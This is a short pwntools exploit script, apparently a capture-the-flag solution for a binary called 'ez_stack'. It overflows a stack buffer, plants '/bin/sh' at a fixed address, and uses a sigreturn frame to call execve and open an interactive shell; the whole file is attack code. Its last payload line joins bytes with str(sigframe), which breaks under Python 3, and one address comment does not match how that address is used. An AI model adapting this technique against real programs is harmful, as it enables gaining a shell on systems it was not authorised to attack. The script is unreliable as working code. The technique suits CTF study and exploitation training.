from pwn import *
context(os = 'linux', arch = 'amd64')

io = process("./ez_stack")
elf = ELF("./ez_stack")

def debug():
	gdb.attach(io, "b *0x4011B9")
mov_rax = 0x401146 #mov rax, 0xf ; ret
syscall = 0x4011EE
binsh =  0x404040 #address of nkctf

payload = b'A'*0x10 + b'deadbeef' + p64(0x4011C8)
io.send(payload)
io.send(b'/bin/sh\x00')

sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = binsh
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall


payload = b'A'*0x10 + b'deadbeef' + p64(mov_rax) + p64(syscall) + str(sigframe)
io.send(payload)
#debug()

io.interactive()